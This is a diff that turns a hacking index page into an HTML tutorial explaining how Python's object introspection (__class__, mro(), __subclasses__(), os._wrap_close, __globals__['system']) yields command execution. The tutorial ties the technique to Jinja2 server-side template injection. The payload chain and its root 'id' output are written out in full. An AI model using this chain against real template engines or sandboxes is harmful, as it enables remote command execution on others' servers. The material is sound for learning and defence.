@@ -1,97 +1,185 @@
+
 <!DOCTYPE html>
 <html>
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacking</title>
+    <title>Var to RCE</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: black;
-            color: #00FF00;
-            margin: 0;
-            padding: 0;
+            font-family: monospace;
+            color: rgb(255, 255, 255);
+            background: black;
+            line-height: 1.5;
         }
 
         h1 {
-            font-size: 24px;
-            margin: 20px;
-            text-align: center;
+            font-size: 40px;
         }
 
-        .file {
-            display: flex;
-            align-items: center;
-            margin: 10px;
-            padding: 10px;
-            border: 1px solid #00FF00;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .file:hover {
-            background-color: #333;
-        }
-
-        .file-icon {
-            width: 40px;
-            height: 40px;
-            background-color: #333;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 10px;
-        }
-
-        .folder-icon {
-            background-image: url('/Itens/internet.png');
-            background-size: cover;
-            width: 80px;
-            height: 40px;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
-
-        .file-details {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .file-name {
+        p {
             font-size: 18px;
+            color: rgb(255, 255, 255);
         }
 
-        .file-description {
-            font-size: 14px;
-            color: #666;
-            margin-top: 5px;
-        }
-
-        .file-modified {
+        p.subtitle {
             font-size: 12px;
-            color: #666;
+            color: rgb(66, 165, 79);
+        }
+        p.topic {
+            font-size: 32px;
+            color: rgb(255, 255, 255);
+        }
+        p.Subtopic {
+            font-size: 20px;
+            color: rgb(255, 255, 255);
+        }
+        pre {
+            font-family: monospace;
+            white-space: pre-wrap;
+            line-height: 125%;
+            background-color: #1a191a;
+            padding: 1em;
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+        }
+
+        .image-container {
+            max-width: 30%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        @media (max-width: 480px) {
+            .image-container img {
+                width: 300px;
+                max-width: none;
+            }
+            .image-container {
+                text-align: left; 
+                margin-left: 0; 
+                margin-right: auto; 
+            }
+        }
+        
+        .gif-container img {
+            width: 100%;
+            height: auto;
+        }
+        .gif-container {
+            max-width: 40%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        @media (max-width: 480px) {
+            .gif-container img {
+                width: 380px;
+                max-width: none;
+            }
+            .gif-container {
+                text-align: left; 
+                margin-left: 0; 
+                margin-right: auto;
+            }
+        }
+        .highlight {
+            background-color: rgb(195, 232, 180);
+            padding: 0.2em 0.5em;
+            border-radius: 4px;
+        }
+
+        .green-text {
+            color: rgb(66, 165, 79);
         }
     </style>
 </head>
 
 <body>
-    <h1>Hacking</h1>
-    <div class="file" onclick="redirectToPage('/en/Post/Hacking/Variavel_To_Rce.html')">
-        <div class="folder-icon"></div>
-        <div class="file-details">
-            <div class="file-name">Variavel_To_Rce.html</div>
-            <div class="file-description">Running commands through variables in Python</div>
-            <div class="file-modified">Modified on August 23, 2023.</div>
-        </div>
+    <h1>RCE via Variable in Python</h1>
+    <p class="subtitle">Don't stop hacking</p>
+    <p>Unlike PHP, in Python, a variable (be it string, float, or int) is an object, which means this variable has
+        built-in functions (that come with Python's core). An example of this is <strong>replace</strong>:</p>
+    <div class="codehilite">
+        <pre><code>
+└─# python3
+Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> variable = 'Gutierreox8o'
+>>> variable.replace('o','0')
+'Gutierre0x80'
+>>> 
+    </code></pre>
     </div>
-    <script>
-        function redirectToPage(url) {
-            window.location.href = url;
-        }
-    </script>
+    <p>Replace is a function that exists within our string object (Variable name).</p>
+    <p>We can see the class type that the variable belongs to using <strong>__class__</strong>. It's important to note that
+        this is not the variable's type, but rather the class it belongs to.</p>
+    <div class="codehilite">
+        <pre><code>
+    &#62;&#62;&#62; variable.__class__
+    &lt;class 'str'&gt;
+    &#62;&#62;&#62;
+        </code></pre>
+    </div>
+    <p>The "variable" is two things. The string and the object.</p>
+    <p>Using the <strong>mro()</strong> function (Method Resolution Order), we can access each of these objects
+        individually:</p>
+    <div class="codehilite">
+        <pre><code>
+&gt;&gt;&gt; variable.__class__.mro()
+[&lt;class 'str'&gt;, &lt;class 'object'&gt;]
+&gt;&gt;&gt; variable.__class__.mro()[1]
+&lt;class 'object'&gt;
+&gt;&gt;&gt;
+
+        </code></pre>
+    </div>
+    <p>I passed the value <strong>[1]</strong> to access the object class because we start counting from 0. If there were
+        one more class, we would have to adapt and choose 2, for example.</p>
+    <p>Now that we have accessed the object class, let's access all the subclasses inside using <strong>__subclasses__()</strong>:</p>
+    <div class="codehilite">
+        <pre><code>
+&gt;&gt;&gt; variable.__class__.mro()[1].__subclasses__()
+[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class...
+&gt;&gt;&gt;
+        </code></pre>
+    </div>
+    <p>All these are the subclasses that exist inside our string. It's interesting to copy this in VS Code and separate
+        it into different lines; you'll understand the reason soon.</p>
+    <div class="image-container">
+        <img src="/Itens/organiza.png" alt="VsCode">
+    </div>
+    <p>In the perfect scenario, we can look for some subclass that has access to a function inside the os library:</p>
+    <div class="image-container">
+        <img src="/Itens/wrap_close.png" alt="Image Description">
+    </div>
+    <p>So, if somehow, we manage to enter the wrap_close function and within this function return to the root of the library (which is os) and call the system function, we could execute commands on the system:</p>
+<p>To enter the wrap_close function, it's quite simple. As this is in an array(), we start counting from zero, so in this case, we will use the value 140 for the os._wrap.close subclass:</p>
+<div class="codehilite">
+    <pre><code>
+&gt;&gt;&gt; variable.__class__.mro()[1].__subclasses__()[140]
+&lt;class 'os._wrap_close'&gt;
+&gt;&gt;&gt;     
+    </code></pre>
+</div>
+<p>The <strong><span class="green-text">__class__</span></strong> attribute returns the class object associated with the variable name. <strong><span class="green-text">mro()</span></strong> is used to access the string and object of the variable individually. The notation <strong><span class="green-text">[1]</span></strong> indicates the position of the object (0,1). You can use <strong><span class="green-text">.__subclasses__()</span></strong> to access the subclasses, and <strong><span class="green-text">[140]</span></strong> to access function 140, which in this case, is equivalent to <strong><span class="green-text">os._wrap_close</span></strong>.</p>
+<p>The <strong><span class="green-text">.__init__</span></strong> function is used to go back to the construct function of os, and <strong><span class="green-text">.__globals__</span></strong> is used to display all variables and libraries existing in the library.</p>
+<p>Now let's call the <strong>system</strong> function from the os module and execute a command.</p>
+<div class="codehilite">
+    <pre><code>
+&gt;&gt;&gt; variable.__class__.mro()[1].__subclasses__()[140].__init__.__globals__['system']('id')
+uid=0(root) gid=0(root) groups=0(root)
+0
+    </code></pre>
+<p>This is used for SSTI exploitation in Jinja2. The logic is exactly the same. Obviously, there are some differences, and os._wrap.close might not always be available. However, using this logic, you can access another subclass that imports the OS.
+</p>
+</div>
 </body>
+
 
 </html>
